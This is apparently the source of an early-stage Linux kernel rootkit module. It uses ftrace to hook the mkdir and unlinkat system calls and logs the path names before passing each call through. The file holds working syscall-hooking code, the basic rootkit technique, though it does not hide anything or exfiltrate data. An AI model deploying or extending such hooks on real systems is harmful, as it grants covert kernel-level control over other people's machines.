#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/namei.h>

#include "hooker.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ostrik");
MODULE_DESCRIPTION("Rootkit project");
MODULE_VERSION("1.0");

static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
static asmlinkage long (*orig_unlinkat)(const struct pt_regs *);

asmlinkage int hook_mkdir(const struct pt_regs *regs) {
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
    return orig_mkdir(regs);
}

asmlinkage int hook_unlinkat(const struct pt_regs *regs) {
    int dfd = regs->di;
    char __user *pathname = (char *)regs->si;
    int flags = regs->dx;

    char file_name[NAME_MAX] = {0};
    long error = strncpy_from_user(file_name, pathname, NAME_MAX);

    if (error > 0) {
        if (flags & AT_REMOVEDIR)
            printk(KERN_INFO "rootkit: trying to remove directory with name: %s\n", file_name);
        else
            printk(KERN_INFO "rootkit: trying to remove file with name: %s\n", file_name);
    }
    return orig_unlinkat(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_unlinkat", hook_unlinkat, &orig_unlinkat),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
